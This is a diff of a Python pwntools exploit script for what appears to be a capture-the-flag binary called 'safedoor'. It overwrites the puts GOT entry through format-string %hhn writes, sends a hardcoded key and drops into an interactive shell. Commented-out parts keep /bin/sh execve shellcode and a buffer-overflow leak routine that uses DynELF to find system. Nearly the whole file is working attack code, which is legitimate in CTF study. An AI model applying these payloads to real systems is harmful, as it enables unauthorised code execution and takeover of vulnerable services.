@@ -20,55 +20,64 @@ call_eax = 0x80484f6
 # p.recvuntil('KEY:')
 io.read_until('KEY:')
 m_p = 0x0804858D
+page_size = 4096
+# x&~(page_size-1)
 
-# gdb.attach(p,'b* 0x080485BD\nc')
-# for x in range(2):
-# 	l = (m_p >> (x*8)) &0xff
-# 	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
-# 	p.sendline(payload)
-# 	p.recvuntil('...')
-# l = (m_p >> (2*8)) &0xff
-# payload = p32(puts_got+2)+"%4$hhn..."
-# p.sendline(payload)
-# p.recvuntil('...')
 
+gdb.attach(p,'b* 0x080485BD\nb*0x804864E\nc')
 for x in range(2):
 	l = (m_p >> (x*8)) &0xff
 	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
-	io.writeline(payload)
-	io.read_until('...')
-
+	p.sendline(payload)
+	p.recvuntil('...')
 l = (m_p >> (2*8)) &0xff
-payload = p32(puts_got+2)+"%%%dc"%(l-4)+"%4$hhn..."
-io.writeline(payload)
-io.read_until('...')
-
-
+payload = p32(puts_got+2)+"%4$hhn..."
+p.sendline(payload)
+p.recvuntil('...')
 l = (m_p >> (3*8)) &0xff
 payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
-io.writeline(payload)
-io.read_until('...')
+p.sendline(payload)
+p.recvuntil('...')
+p.sendline('STjJaOEwLszsLwRy')
+p.recvuntil('\nKEY:')
+p.interactive()
+
+# for x in range(2):
+# 	l = (m_p >> (x*8)) &0xff
+# 	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
+# 	io.writeline(payload)
+# 	io.read_until('...')
+
+# l = (m_p >> (2*8)) &0xff
+# payload = p32(puts_got+2)+"%%%dc"%(l-4)+"%4$hhn..."
+# io.writeline(payload)
+# io.read_until('...')
+# l = (m_p >> (3*8)) &0xff
+# payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
+# io.writeline(payload)
+# io.read_until('...')
 
 
-io.writeline('STjJaOEwLszsLwRy')
-io.read_until('\nKEY:')
 
-# p.sendline('STjJaOEwLszsLwRy')
-# p.recvuntil('\nKEY:')
+
+# io.writeline('STjJaOEwLszsLwRy')
+# io.read_until('\nKEY:')
+
+
 #put shellcode
 # buf =  "\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 # shellcode = buf+(0x88+4-len(buf))*'A'
-def leak(addr):
-	payload1 = 'A'*140+p32(printf_plt)+p32(p_ret)+p32(addr)+p32(puts_plt)
+# def leak(addr):
+# 	payload1 = 'A'*140+p32(printf_plt)+p32(p_ret)+p32(addr)+p32(puts_plt)
 	# +p32(p_ret)+p32(bss_addr)+p32(bss_addr)
-	io.writeline(payload1)
-	data =io.read(4)
+# 	io.writeline(payload1)
+# 	data =io.read(4)
 	
 	# print data
 	# print 1
-	return data
-d = DynELF('./safedoor', leak) 
-system = d.lookup('system') 
+# 	return data
+# d = DynELF('./safedoor', leak) 
+# system = d.lookup('system') 
 # payload1 = 'A'*140+p32(printf_plt)+p32(p_ret)+p32(puts_got)+p32(puts_plt)
 # p.sendline(payload1)
 # print p.recvline()
@@ -77,4 +86,4 @@ system = d.lookup('system')
 # shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 # p.sendline(shellcode)
 # p.interactive()
-io.inter()
+# io.inter()
